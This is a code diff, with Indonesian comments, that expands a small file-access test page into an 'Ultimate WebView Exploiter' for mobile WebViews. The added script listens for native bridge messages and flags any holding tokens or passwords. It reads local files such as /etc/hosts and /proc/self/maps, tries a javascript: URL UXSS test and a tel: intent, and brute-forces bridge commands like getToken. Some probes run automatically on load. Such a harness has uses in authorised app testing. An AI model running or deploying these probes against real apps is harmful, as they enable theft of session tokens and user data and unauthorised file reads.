@@ -1,14 +1,102 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ultimate WebView Exploiter</title>
+    <style>
+        body { background: #0a0c10; color: #58a6ff; font-family: 'Segoe UI', monospace; padding: 15px; }
+        .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 12px; margin-bottom: 15px; }
+        .title { color: #f0f6fc; font-weight: bold; border-bottom: 1px solid #30363d; margin-bottom: 10px; display: block; }
+        .log { background: #000; color: #39ff14; padding: 8px; border-radius: 4px; font-size: 11px; height: 120px; overflow-y: auto; border: 1px solid #444; }
+        .status-ok { color: #7ee787; font-weight: bold; }
+        button { background: #238636; color: white; border: none; padding: 8px; border-radius: 4px; cursor: pointer; width: 100%; margin: 5px 0; font-size: 12px; }
+        button:hover { background: #2ea043; }
+    </style>
+</head>
 <body>
-    <h3>File Access Test</h3>
-    <div id="res">Mencoba membaca file lokal...</div>
+
+    <div class="card">
+        <span class="title">[1] Bridge Data Sniffer</span>
+        <div id="sniff-log" class="log">Mendengarkan pesan dari Native...</div>
+    </div>
+
+    <div class="card">
+        <span class="title">[2] File Access Test (LFI)</span>
+        <div id="file-log" class="log">Mencoba akses file sistem...</div>
+    </div>
+
+    <div class="card">
+        <span class="title">[3] Interaction & UXSS</span>
+        <button onclick="testUXSS()">Jalankan UXSS Test</button>
+        <button onclick="testIntents()">Jalankan Intent Injection</button>
+        <button onclick="bruteBridge()">Brute-Force Bridge Commands</button>
+    </div>
+
     <script>
-        // Mencoba membaca file sistem (untuk Android)
-        fetch('file:///etc/hosts')
-            .then(r => r.text())
-            .then(t => document.getElementById('res').innerText = "VULNERABLE: \n" + t)
-            .catch(e => document.getElementById('res').innerText = "Secure: " + e.message);
+        const sniffLog = document.getElementById('sniff-log');
+        const fileLog = document.getElementById('file-log');
+
+        function log(el, msg) {
+            el.innerText = [${new Date().toLocaleTimeString()}] ${msg}\n + el.innerText;
+        }
+
+        // --- 1. SNIFFER: Mencuri data dari Native ---
+        window.addEventListener("message", (event) => {
+            log(sniffLog, "DATA MASUK: " + JSON.stringify(event.data));
+            if (JSON.stringify(event.data).match(/token|auth|user|pass/i)) {
+                alert("BOOM! DATA SENSITIF DITEMUKAN!");
+            }
+        });
+
+        // --- 2. LFI: Mencoba membaca file internal ---
+        async function checkFiles() {
+            const targets = ['file:///etc/hosts', 'file:///proc/self/maps'];
+            for (let path of targets) {
+                try {
+                    const res = await fetch(path);
+                    const text = await res.text();
+                    if (text) {
+                        log(fileLog, "SUKSES BACA: " + path);
+                        fileLog.innerHTML = <span class="status-ok">VULNERABLE!</span>\n + fileLog.innerHTML;
+                    }
+                } catch (e) {
+                    log(fileLog, "Gagal: " + path);
+                }
+            }
+        }
+
+        // --- 3. UXSS & Intents ---
+        function testUXSS() {
+            // Mencoba merubah domain secara paksa
+            window.location.href = "javascript:alert('UXSS Terdeteksi di: ' + document.domain)";
+        }
+
+        function testIntents() {
+            // Membuka dialer otomatis
+            window.location.href = "tel:123456";
+        }
+
+        function bruteBridge() {
+            if (window.webkit?.messageHandlers?.ReactNativeWebView) {
+                const cmd = [{a:"getToken"}, {a:"getProfile"}, {a:"config"}];
+                cmd.forEach(p => {
+                    window.webkit.messageHandlers.ReactNativeWebView.postMessage(p);
+                    log(sniffLog, "Sent brute: " + JSON.stringify(p));
+                });
+            } else {
+                alert("Native Bridge tidak aktif.");
+            }
+        }
+
+        // Jalankan pancingan otomatis saat startup
+        setTimeout(() => {
+            checkFiles();
+            if (window.webkit?.messageHandlers?.ReactNativeWebView) {
+                window.webkit.messageHandlers.ReactNativeWebView.postMessage({type: "READY"});
+                log(sniffLog, "Pancingan 'READY' terkirim.");
+            }
+        }, 2000);
     </script>
 </body>
 </html>
